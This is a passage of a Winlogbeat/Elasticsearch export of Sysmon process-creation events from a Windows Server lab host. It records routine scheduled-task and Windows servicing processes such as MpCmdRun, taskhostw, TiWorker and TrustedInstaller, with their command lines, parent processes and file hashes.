" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:43.306"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16453	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.305"	"IRDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.234"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.303
ProcessGuid: {6e4a868b-05df-6a18-1f01-000000002300}
ProcessId: 5840
Image: C:\Windows\System32\dstokenclean.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
Description: Data Sharing Service Maintenance Driver
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: dstokenclean.exe
CommandLine: ""C:\Windows\system32\dstokenclean.exe""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=6A7D8561BCBA33ED64E3BEFD67C10CA0,SHA256=066AEB24EC4007483EDB2AC0893236069F463E598FC18FF5646B28D067A74F58,IMPHASH=F1D06B8C52F369E9C51A17B21E2BD700
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\system32\dstokenclean.exe"""	"Microsoft Corporation"	"C:\Windows\system32\"	"Data Sharing Service Maintenance Driver"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1 (WinBuild.160101.0800)"	" - "	"MD5=6A7D8561BCBA33ED64E3BEFD67C10CA0,SHA256=066AEB24EC4007483EDB2AC0893236069F463E598FC18FF5646B28D067A74F58,IMPHASH=F1D06B8C52F369E9C51A17B21E2BD700"	"C:\Windows\System32\dstokenclean.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"dstokenclean.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-1f01-000000002300}"	5840	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:43.303"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16452	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.283"	"IBDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.233"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.282
ProcessGuid: {6e4a868b-05df-6a18-1c01-000000002300}
ProcessId: 5140
Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe
FileVersion: 4.18.26040.7 (8d846dd50fd7adca65beb1b013a5fda76a9ec807)
Description: Microsoft Malware Protection Command Line Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MpCmdRun.exe
CommandLine: ""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe"" -IdleTask -TaskName WdCleanup
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=66279F51DE8401F4D341B50C4DDCECFE,SHA256=F75D5C7E266452790259595DDC73DC83CD31B304452095494079CA41A7D4C69E,IMPHASH=972772FD61F841DF9B4EA185FD4CB03C
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe"" -IdleTask -TaskName WdCleanup"	"Microsoft Corporation"	"C:\Windows\system32\"	"Microsoft Malware Protection Command Line Utility"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"4.18.26040.7 (8d846dd50fd7adca65beb1b013a5fda76a9ec807)"	" - "	"MD5=66279F51DE8401F4D341B50C4DDCECFE,SHA256=F75D5C7E266452790259595DDC73DC83CD31B304452095494079CA41A7D4C69E,IMPHASH=972772FD61F841DF9B4EA185FD4CB03C"	"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26040.7-0\MpCmdRun.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"MpCmdRun.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-1c01-000000002300}"	5140	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:43.282"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16451	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.280"	"HxDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.233"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.280
ProcessGuid: {6e4a868b-05df-6a18-1b01-000000002300}
ProcessId: 3236
Image: C:\Windows\System32\taskhostw.exe
FileVersion: 10.0.17763.1852 (WinBuild.160101.0800)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {6e4a868b-012d-6a18-e503-000000000000}
LogonId: 0x3E5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=8BD7B08DA6BCA54DF9B595E4D9281BEB,SHA256=DE85F29A8BC7219F10A4AC88654C3901ABC329D7505B21CD95CBF780D1EBCCF4,IMPHASH=9839C7FD9649496B162F72128209528A
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"taskhostw.exe"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Tasks"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1852 (WinBuild.160101.0800)"	" - "	"MD5=8BD7B08DA6BCA54DF9B595E4D9281BEB,SHA256=DE85F29A8BC7219F10A4AC88654C3901ABC329D7505B21CD95CBF780D1EBCCF4,IMPHASH=9839C7FD9649496B162F72128209528A"	"C:\Windows\System32\taskhostw.exe"	" - "	System	"{6e4a868b-012d-6a18-e503-000000000000}"	0x3e5	"taskhostw.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-1b01-000000002300}"	3236	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\LOCAL SERVICE"	"2026-05-28 09:07:43.280"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16450	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.278"	"HhDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.233"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.276
ProcessGuid: {6e4a868b-05df-6a18-1a01-000000002300}
ProcessId: 3724
Image: C:\Windows\System32\DiskSnapshot.exe
FileVersion: 10.0.17763.652 (WinBuild.160101.0800)
Description: DiskSnapshot.exe
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: DiskSnapshot.exe
CommandLine: ""C:\Windows\system32\disksnapshot.exe"" -z
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=ECE311FF51BD847A3874BFAC85449C6B,SHA256=C7B9591EB4DD78286615401C138C7C1A89F0E358CAAE1786DE2C3B08E904FFDC,IMPHASH=69BDABB73B409F40AD05F057CEC29380
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\system32\disksnapshot.exe"" -z"	"Microsoft Corporation"	"C:\Windows\system32\"	"DiskSnapshot.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.652 (WinBuild.160101.0800)"	" - "	"MD5=ECE311FF51BD847A3874BFAC85449C6B,SHA256=C7B9591EB4DD78286615401C138C7C1A89F0E358CAAE1786DE2C3B08E904FFDC,IMPHASH=69BDABB73B409F40AD05F057CEC29380"	"C:\Windows\System32\DiskSnapshot.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"DiskSnapshot.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-1a01-000000002300}"	3724	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:43.276"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16449	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:43.253"	"HRDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:45.233"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:43.246
ProcessGuid: {6e4a868b-05df-6a18-1901-000000002300}
ProcessId: 2448
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.17763.1697 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" Startupscan.dll,SusRunTask
CurrentDirectory: C:\Windows\system32\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=80F8E0C26028E83F1EF371D7B44DE3DF,SHA256=9F1E56A3BF293AC536CF4B8DAD57040797D62DBB0CA19C4ED9683B5565549481,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\system32\rundll32.exe"" Startupscan.dll,SusRunTask"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows host process (Rundll32)"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1697 (WinBuild.160101.0800)"	" - "	"MD5=80F8E0C26028E83F1EF371D7B44DE3DF,SHA256=9F1E56A3BF293AC536CF4B8DAD57040797D62DBB0CA19C4ED9683B5565549481,IMPHASH=F27A7FC3A53E74F45BE370131953896A"	"C:\Windows\System32\rundll32.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"RUNDLL32.EXE"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05df-6a18-1901-000000002300}"	2448	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 09:07:43.246"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16448	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:42.275"	"EhDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:44.222"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:42.270
ProcessGuid: {6e4a868b-05de-6a18-1801-000000002300}
ProcessId: 6328
Image: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.8754_none_56c5d8c199369b17\TiWorker.exe
FileVersion: 10.0.17763.8754 (WinBuild.160101.0800)
Description: Windows Modules Installer Worker
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: TiWorker.exe
CommandLine: C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.8754_none_56c5d8c199369b17\TiWorker.exe -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=E8E7C1A163D1EA507D8CC2FCD707FC78,SHA256=55B73781B087BF1622809F3458129026DA33849F2181E7538C625BA8A577503B,IMPHASH=1CBCFAF36C2AD99E911D299737C12477
ParentProcessGuid: {6e4a868b-012d-6a18-0e00-000000002300}
ParentProcessId: 888
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.8754_none_56c5d8c199369b17\TiWorker.exe -Embedding"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows Modules Installer Worker"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.8754 (WinBuild.160101.0800)"	" - "	"MD5=E8E7C1A163D1EA507D8CC2FCD707FC78,SHA256=55B73781B087BF1622809F3458129026DA33849F2181E7538C625BA8A577503B,IMPHASH=1CBCFAF36C2AD99E911D299737C12477"	"C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.17763.8754_none_56c5d8c199369b17\TiWorker.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"TiWorker.exe"	"C:\Windows\system32\svchost.exe -k DcomLaunch -p"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012d-6a18-0e00-000000002300}"	888	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05de-6a18-1801-000000002300}"	6328	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:42.270"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16447	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:42.259"	"EBDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:44.222"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:42.254
ProcessGuid: {6e4a868b-05de-6a18-1701-000000002300}
ProcessId: 6048
Image: C:\Windows\servicing\TrustedInstaller.exe
FileVersion: 10.0.17763.8276 (WinBuild.160101.0800)
Description: Windows Modules Installer
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: TrustedInstaller.exe
CommandLine: C:\Windows\servicing\TrustedInstaller.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\servicing\TrustedInstaller.exe"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows Modules Installer"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.8276 (WinBuild.160101.0800)"	" - "	"MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F"	"C:\Windows\servicing\TrustedInstaller.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"TrustedInstaller.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05de-6a18-1701-000000002300}"	6048	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:07:42.254"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16445	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:42.250"	"DxDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:44.222"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:42.247
ProcessGuid: {6e4a868b-05de-6a18-1601-000000002300}
ProcessId: 1120
Image: C:\Windows\System32\Speech_OneCore\common\SpeechModelDownload.exe
FileVersion: 10.0.17763.8276 (WinBuild.160101.0800)
Description: Speech Model Download Executable
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: SpeechModelDownload.exe
CommandLine: ""C:\Windows\system32\speech_onecore\common\SpeechModelDownload.exe""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {6e4a868b-012d-6a18-e403-000000000000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=E39C144C37E97F58DABAF170315CF115,SHA256=F0171D29467D8C3BFC2BE6ECCDCA8CFB76BC52BAEE325AAF4B2D1DD355CA5912,IMPHASH=583661BDD1DEE6B089C8C8D48C67FA3F
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\system32\speech_onecore\common\SpeechModelDownload.exe"""	"Microsoft Corporation"	"C:\Windows\system32\"	"Speech Model Download Executable"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.8276 (WinBuild.160101.0800)"	" - "	"MD5=E39C144C37E97F58DABAF170315CF115,SHA256=F0171D29467D8C3BFC2BE6ECCDCA8CFB76BC52BAEE325AAF4B2D1DD355CA5912,IMPHASH=583661BDD1DEE6B089C8C8D48C67FA3F"	"C:\Windows\System32\Speech_OneCore\common\SpeechModelDownload.exe"	" - "	System	"{6e4a868b-012d-6a18-e403-000000000000}"	0x3e4	"SpeechModelDownload.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05de-6a18-1601-000000002300}"	1120	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\NETWORK SERVICE"	"2026-05-28 09:07:42.247"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16444	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:07:42.238"	"DhDXbZ4ByrYY_kgLDHyV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:07:44.222"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:07:42.237
ProcessGuid: {6e4a868b-05de-6a18-1501-000000002300}
ProcessId: 4324
Image: C:\Windows\System32\taskhostw.exe
FileVersion: 10.0.17763.1852 (WinBuild.160101.0800)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhostw.exe
CommandLine: taskhostw.exe Install $(Arg0)
CurrentDirectory: C:\Windows\system32\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=8BD7B08DA6BCA54DF9B595E4D9281BEB,SHA256=DE85F29A8BC7219F10A4AC88654C3901ABC329D7505B21CD95CBF780D1EBCCF4,IMPHASH=9839C7FD9649496B162F72128209528A
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"taskhostw.exe Install $(Arg0)"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Tasks"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1852 (WinBuild.160101.0800)"	" - "	"MD5=8BD7B08DA6BCA54DF9B595E4D9281BEB,SHA256=DE85F29A8BC7219F10A4AC88654C3901ABC329D7505B21CD95CBF780D1EBCCF4,IMPHASH=9839C7FD9649496B162F72128209528A"	"C:\Windows\System32\taskhostw.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"taskhostw.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-05de-6a18-1501-000000002300}"	4324	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 09:07:42.237"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	16443	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
